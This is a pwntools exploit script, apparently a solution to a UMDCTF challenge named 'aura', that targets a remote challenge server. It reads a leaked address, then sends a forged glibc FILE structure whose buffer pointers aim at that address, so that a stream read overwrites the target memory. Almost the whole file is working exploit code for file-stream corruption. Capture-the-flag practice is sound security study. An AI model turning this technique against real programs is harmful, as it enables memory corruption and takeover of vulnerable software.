from pwn import *

context.log_level = "debug"
context.arch = "amd64"
context.os = "linux"
context.terminal = ["/usr/bin/tmux", "sp", "-h"]

f_remote = True if "remote" in sys.argv else False
f_gdb = True if "gdb" in sys.argv else False

vuln_path = "./aura"
libc_path = "./libc.so.6"

elf, rop = ELF(vuln_path), ROP(vuln_path)
# libc, roplibc = ELF(libc_path), ROP(libc_path)

if not f_remote:
    io = process([vuln_path])
    # io = process([ld_path, vuln_path], env={"LD_PRELOAD": libc_path})
else:
    io = remote("challs.umdctf.io", 31006)


def ddebug(b=""):
    if not f_gdb:
        return

    gdb.attach(io, gdbscript=b)
    pause()

# u64(io.recvuntil("\x7f")[-6:].ljust(8, b"\x00"))

io.recvuntil("0x", drop=True)
data=io.recvuntil("\n", drop=True)
aura = int(data, 16)
log.success("aura:-----> " + hex(aura))



payload = b""
payload += p64(0xFBAD0000 | 0x8000)
payload += p64(0)  #char *_IO_read_ptr;	/* Current read pointer */
payload += p64(0)  #char *_IO_read_end;	/* End of get area. */
payload += p64(0)  #char *_IO_read_base;	/* Start of putback+get area. */
payload += p64(0)  #char *_IO_write_base;	/* Start of put area. */
payload += p64(0)  #char *_IO_write_ptr;	/* Current put pointer. */
payload += p64(0)  #char *_IO_write_end;	/* End of put area. */
payload += p64(aura)  #char *_IO_buf_base;	/* Start of reserve area. */
payload += p64(aura+0x20)  #char *_IO_buf_end;	/* End of reserve area. */
payload += p64(0)*9

io.sendlineafter("aura?", payload)
io.sendline(b'A' * 100) 
io.interactive()

